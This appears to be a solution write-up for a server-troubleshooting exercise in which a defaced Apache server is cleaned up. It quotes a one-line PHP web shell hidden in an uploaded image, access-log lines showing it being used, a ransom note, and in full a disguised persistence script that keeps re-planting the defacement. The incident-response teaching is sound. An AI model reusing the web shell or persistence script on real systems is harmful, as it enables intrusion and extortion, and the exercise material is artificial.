## "Anatolia": compromised server

### Problem

Description: This web server has been compromised and is not serving the home page anymore, those troubleshooting skills you have as DevOps are urgently needed to solve the mystery of the missed home page and restore the integrity of the server.

Note: The default configuration files under /etc/apache2 are not the problem.

This scenario is based on a real server that was "hacked". Ideally you'd recover from infrastrucrure as code playbooks and clean data backups on a new server with the vulnerabilities fixed. Instead, in this exercise you are asked to clean manually the compromised server, restore it to a working condition and ideally, find how the server was broken into. The solution test only checks that the web service is working.

### Solution

1. try to curl and see what we will get

```
admin@i-07a8410b1f61b9b16:~$ curl localhost
You've been hacked!

Send $5000 to the following address to get your site back
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
```

2. check the apache2 server access log

* Attacker use `POST /upload.php` endpoint to uploaded a php file - 96d0100c-f135-4e6b-827b-a180300fa486.jpg.php
* Then the attacker call `GET /uploads/96d0100c-f135-4e6b-827b-a180300fa486.jpg.php?cmd=ls` to check if the web server will run the php file via php engine

```
admin@i-07a8410b1f61b9b16:~$ sudo tail -n 100 /var/log/apache2/access.log
172.18.0.2 - - [03/Apr/2026:14:41:42 +0000] "GET / HTTP/1.1" 200 10958 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36,"
172.18.0.4 - - [03/Apr/2026:14:41:42 +0000] "POST /upload.php HTTP/1.1" 200 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
172.18.0.3 - - [03/Apr/2026:14:41:42 +0000] "POST /upload.php HTTP/1.1" 200 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36,"
172.18.0.2 - - [03/Apr/2026:14:41:42 +0000] "POST /upload.php HTTP/1.1" 200 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,"
172.18.0.2 - - [03/Apr/2026:14:41:42 +0000] "GET / HTTP/1.1" 200 10958 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15,"
172.18.0.4 - - [03/Apr/2026:14:41:42 +0000] "GET /uploads/96d0100c-f135-4e6b-827b-a180300fa486.jpg.php?cmd=ls HTTP/1.1" 200 459 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
172.18.0.3 - - [03/Apr/2026:14:41:42 +0000] "POST /upload.php HTTP/1.1" 200 443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,"
172.18.0.2 - - [03/Apr/2026:14:41:42 +0000] "POST /upload.php HTTP/1.1" 200 443 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36,"
```

3. remove the php file

```
admin@i-07a8410b1f61b9b16:~$ cd //var/www/html/uploads/
admin@i-07a8410b1f61b9b16://var/www/html/uploads$ ls
0c6018f2-99c9-4cc7-a21f-c246cf01418d.jpg  4073cce5-75c9-4027-961f-8d66d928be4d.jpg      a8c29293-2f5c-4af9-b746-fad00fce823f.jpg  dadee509-ad86-43a4-9415-a86133f6f0f3.jpg
0fa5afef-e041-4e44-b314-5142e814328b.jpg  4615a4f2-3d22-48d1-8c84-c503ad02b35d.jpg      aaff99e2-0808-4090-9dd8-5f820f8e09f7.jpg  dd4b4119-2277-43f8-b32b-cb08710880f8.jpg
1762b714-4494-4fd4-994b-538174b2de51.jpg  4cf14b25-c213-4690-84c1-082799efbe21.jpg      ab62e665-78d6-4614-a715-e2699366f4e2.jpg  e4de05d4-c010-4e28-8440-c35d254c573b.jpg
191949ae-38e7-42ff-8b81-df119fa74b32.jpg  583c0d0f-1352-427e-85f1-e5ddac5ec398.jpg      abe4e4a2-781e-4edd-827d-6dca95b87f44.jpg  ed1b40f9-739b-4bb0-9dfb-98788973a558.jpg
198f0786-d69c-4027-adcf-5e49d0fb8c23.jpg  593f9e78-c098-4619-9daa-9202b2d7cdf3.jpg      ae4192e4-999a-418d-9885-8eab11f842c7.jpg  ee9295bf-0e39-4569-b46d-ead357a2d55d.jpg
2541429b-ae54-4a3d-b489-74d090a0ac42.jpg  7ea97d81-ce40-4fa3-8421-8ad9e86181a4.jpg      c518461e-2df8-4717-b851-328083b68491.jpg  f6c69439-17a4-4fae-9bcb-af948612ad8d.jpg
2c5d032b-d4e1-4070-89b3-7c01b320ca1c.jpg  84dafa95-7727-4245-85cf-73735fd48247.jpg      c6b0b7e5-d9f8-4f97-ad0e-c7b8b7ed270b.jpg  f80e511c-7db2-438d-8378-00c7228a6a86.jpg
358d8a30-7893-4bbd-9a20-e5c758545187.jpg  8afa22ca-0481-424c-b388-f975272ee7bf.jpg      cc1b4b6d-87d5-4b58-a190-413ac5721cf5.jpg  fec1b321-7449-46ce-8e34-cbc095333d57.jpg
36861099-9c80-4ad8-b0fb-00ac56c03414.jpg  96d0100c-f135-4e6b-827b-a180300fa486.jpg.php  cf3d5eef-0d63-4750-8464-8698312e722f.jpg
3b74a5b7-35f4-488f-91ee-f7d1ab1818ad.jpg  a6bea0d5-fc71-4f2b-acb1-a9deb56e1d31.jpg      d4ce5839-505f-4418-bca5-915c63093cf2.jpg
3f04add4-2396-4a34-baf4-435b4a9c8218.jpg  a809270b-827f-472c-a9ac-6e3227261fdc.jpg      d536a7e2-68dc-4f71-b0da-a35cc980618e.jpg
admin@i-07a8410b1f61b9b16://var/www/html/uploads$ cat 96d0100c-f135-4e6b-827b-a180300fa486.jpg.php 
JFIFC










       ?T<?php system($_GET["cmd"]); ?>
admin@i-07a8410b1f61b9b16://var/www/html/uploads$ sudo rm *.php
```

4. disable php execution

```
admin@i-07a8410b1f61b9b16://var/www/html/uploads$ cat .htaccess 
php_flag engine off
```

5. remove the compromised index page

* The attacker added immutable attribute to index.html to prevent the file being deleted
    * https://man7.org/linux/man-pages/man1/chattr.1.html
* The index.html is automatically created after the remove command

```
admin@i-07a8410b1f61b9b16://var/www/html$ cat index.html 
You've been hacked!

Send $5000 to the following address to get your site back
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
admin@i-07a8410b1f61b9b16://var/www/html$ cat index.php
<?php echo "SadServer - Anatolia" ?>
admin@i-07a8410b1f61b9b16://var/www/html$ lsattr /var/www/html/index.html
----i---------e------- /var/www/html/index.html
admin@i-07a8410b1f61b9b16://var/www/html$ sudo chattr -i /var/www/html/index.html
admin@i-07a8410b1f61b9b16:/var/www/html$ sudo lsattr index.html 
--------------e------- index.html
admin@i-07a8410b1f61b9b16://var/www/html$ sudo rm /var/www/html/index.html
admin@i-07a8410b1f61b9b16:/var/www/html$ sudo rm index.html 
admin@i-07a8410b1f61b9b16:/var/www/html$ ls
index.html  index.php  upload.php  uploads
admin@i-07a8410b1f61b9b16:/var/www/html$ sudo lsattr index.html 
----i---------e------- index.html
```

6. find the background process who monitor the index.html

```
admin@i-07a8410b1f61b9b16:/var/www/html$ ps auxf | grep -E "while|sleep|sh" -A 3
root           7  0.0  0.0      0     0 ?        I<   11:20   0:00  \_ [kworker/R-slub_flushwq]
root           8  0.0  0.0      0     0 ?        I<   11:20   0:00  \_ [kworker/R-netns]
root          10  0.0  0.0      0     0 ?        I    11:20   0:00  \_ [kworker/0:1-events_power_efficient]
root          11  0.0  0.0      0     0 ?        I<   11:20   0:00  \_ [kworker/0:0H-events_highpri]
--
admin        753  0.1  2.8 1304784 12804 ?       S<sl 11:20   0:00 /usr/local/gotty --permit-write --reconnect --max-connection 5 bash -l
admin       1662  0.0  1.3   6716  5964 pts/0    S<s  11:21   0:00  \_ bash -l
admin       3884  0.0  0.8   6848  3992 pts/0    R<+  11:32   0:00      \_ ps auxf
admin       3885  0.0  0.4   3940  2132 pts/0    S<+  11:32   0:00      \_ grep -E while|sleep|sh -A 3
admin        754  0.0  2.4 1080748 11308 ?       S<sl 11:20   0:00 /home/admin/agent/sadagent
root         757  0.0  0.5   4276  2640 ?        Ss   11:20   0:00 /usr/sbin/cron -f
message+     760  0.0  0.9   8048  4500 ?        Ss   11:20   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         780  0.0  0.7   4632  3488 ?        Ss   11:20   0:00 /bin/bash /usr/bin/system-update
root        3883  0.0  0.3   3020  1728 ?        S    11:32   0:00  \_ sleep 1
root         783  0.0  1.8  18480  8552 ?        Ss   11:20   0:00 /usr/lib/systemd/systemd-logind
root         814  0.0  0.5   5168  2612 tty1     Ss+  11:20   0:00 /sbin/agetty -o -- \u --noreset --noclear - linux
root         821  0.0  0.5   5212  2668 ttyS0    Ss+  11:20   0:00 /sbin/agetty -o -- \u --noreset --noclear --keep-baud 115200,57600,38400,9600 - vt220
root         838  0.0  1.7  11768  7960 ?        Ss   11:20   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         869  0.0 10.0 1728304 45716 ?       Ssl  11:20   0:00 /usr/bin/containerd
root         889  0.0  4.7  36832 21444 ?        Ss   11:20   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         907  0.0  4.7 238124 21476 ?        Ss   11:20   0:00 /usr/sbin/apache2 -k start
www-data     958  0.0  1.8 238156  8344 ?        S    11:20   0:00  \_ /usr/sbin/apache2 -k start
www-data     971  0.0  1.8 238156  8344 ?        S    11:20   0:00  \_ /usr/sbin/apache2 -k start
```

This process runs `sleep 1`

```
root         780  0.0  0.7   4632  3488 ?        Ss   11:20   0:00 /bin/bash /usr/bin/system-update
root        3883  0.0  0.3   3020  1728 ?        S    11:32   0:00  \_ sleep 1
```

7. cat /usr/bin/system-update

found the monitor process

```
admin@i-07a8410b1f61b9b16:/var/www/html$ cat /usr/bin/system-update
#!/bin/bash

# Configuration
TARGET_FILE="/var/www/html/index.html"
TARGET_SUM="ca3c7881f058b90cef6428302965a98d87bb8b3a8b1b88d5ff972b48379da831"
UPDATE_FILE="/var/www/.index.html"
UPDATE_CONTENT="H4sIAAAAAAAAAxXMTQ7CIBBA4T2nGBMTt0g10XO4ctl2BmghjMD0B09vXb98783LZSUYiBL4fgyEJ6VelBDOd601CIN4Assx8jYlBz1ioVr/wZFA46VAneRYHFoN4zXvzQSHzc2lZvlmk3Qr1tye3efRhWBnv+stevUD60R373oAAAA="
CHECK_INTERVAL=1

# f(n): check if the update file exists
check_update_file() {
        if [ ! -f "${UPDATE_FILE}" ]; then
                echo ${UPDATE_CONTENT} | base64 -d | gunzip > ${UPDATE_FILE}
                exit 1
        else
                sha256sum -c < <(echo "${TARGET_SUM} ${UPDATE_FILE}") 2>&1 >/dev/null \
                        || echo ${UPDATE_CONTENT} | base64 -d | gunzip > ${UPDATE_FILE}
        fi
}

# f(n): check target file
check_target_file() {
        if [ ! -f "${TARGET_FILE}" ]; then
                touch ${TARGET_FILE}
        fi
        sha256sum -c < <(echo "${TARGET_SUM} ${TARGET_FILE}") 2>&1 >/dev/null || update_file
}

# f(n): update file
update_file() {
        check_update_file
        chattr -i "${TARGET_FILE}"
        cp "${UPDATE_FILE}" "${TARGET_FILE}"
        chattr +i "${TARGET_FILE}"
}

# f(n): get file modification time
get_file_mtime() {
        stat -c %Y "${TARGET_FILE}" 2>/dev/null || echo "0"
}

# f(n): monitoring
monitor_file() {
        local LAST_MTIME=$(get_file_mtime)

        while true; do
                # check if file still exists
                if [ ! -f "${TARGET_FILE}" ]; then
                        check_target_file
                        LAST_MTIME=$(get_file_mtime)
                        continue
                fi

                # get current modification time
                CURRENT_MTIME=$(get_file_mtime)

                # check if file has been modified
                if [ "${CURRENT_MTIME}" != "${LAST_MTIME}" ]; then
                        # update file if check fails
                        check_target_file
                        LAST_MTIME=$(get_file_mtime)
                fi

                sleep "${CHECK_INTERVAL}"
        done
}

# Check if files exist
check_target_file

# Start monitoring
monitor_file
```

8. remove and kill the monitor process

```
admin@i-07a8410b1f61b9b16:~$ sudo systemctl stop system-update.service
admin@i-07a8410b1f61b9b16:~$ sudo systemctl disable system-update.service
Removed '/etc/systemd/system/multi-user.target.wants/system-update.service'.
admin@i-07a8410b1f61b9b16:~$ sudo rm /usr/lib/systemd/system/system-update.service
admin@i-07a8410b1f61b9b16:~$ sudo systemctl daemon-reload
admin@i-07a8410b1f61b9b16:~$ sudo rm /usr/bin/system-update
admin@i-07a8410b1f61b9b16:~$ ls /var/www/html
index.php  upload.php  uploads
```
